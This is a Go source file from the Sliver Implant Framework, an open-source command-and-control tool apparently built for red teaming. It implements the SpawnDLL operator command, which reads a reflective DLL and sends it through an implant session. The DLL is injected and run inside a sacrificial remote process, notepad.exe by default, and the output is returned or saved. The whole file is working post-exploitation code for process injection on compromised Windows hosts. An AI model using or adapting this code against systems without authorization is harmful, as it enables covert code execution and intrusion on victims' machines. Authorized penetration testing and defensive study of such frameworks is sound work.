package execute

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"

	"github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// SpawnDLL - Load and execute a Reflective DLL in a remote process
type SpawnDLL struct {
	Positional struct {
		Path string   `description:"path to reflective DLL" required:"1-1"`
		Args []string `description:"(optional) arguments to be passed when executing the DLL"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		Export     string `long:"export" short:"e" description:"entrypoint of the reflective DLL" default:"ReflectiveLoader"`
		RemotePath string `long:"process" short:"p" description:"path to process to host the DLL" default:"c:\\windows\\system32\\notepad.exe"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
		KeepAlive  bool   `long:"keep-alive" short:"k" description:"don't terminate host process once the execution completes"`
	} `group:"dll options"`
}

// Execute - Load and execute a Reflective DLL in a remote process
func (s *SpawnDLL) Execute(cargs []string) (err error) {
	session := core.ActiveTarget.Session

	var args = strings.Join(s.Positional.Args, " ")

	binPath := s.Positional.Path
	processName := s.Options.RemotePath
	exportName := s.Options.Export

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		return log.Errorf("%s", err.Error())
	}
	ctrl := make(chan bool)
	go log.SpinUntil(fmt.Sprintf("Executing reflective dll %s", binPath), ctrl)
	spawndll, err := transport.RPC.SpawnDll(context.Background(), &sliverpb.InvokeSpawnDllReq{
		Data:        binData,
		ProcessName: processName,
		Args:        args,
		EntryPoint:  exportName,
		Kill:        !s.Options.KeepAlive,
		Request:     core.ActiveTarget.Request(),
	})

	if err != nil {
		return log.Errorf("Error: %v", err)
	}
	ctrl <- true
	<-ctrl
	if spawndll.GetResponse().GetErr() != "" {
		return log.Errorf("Error: %s", spawndll.GetResponse().GetErr())
	}
	var outFilePath *os.File
	if s.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.SpawnDllStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	log.Infof("Output:\n%s", spawndll.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(spawndll.GetResult()))
		log.Infof("Output saved to %s\n", outFilePath.Name())
	}

	return
}
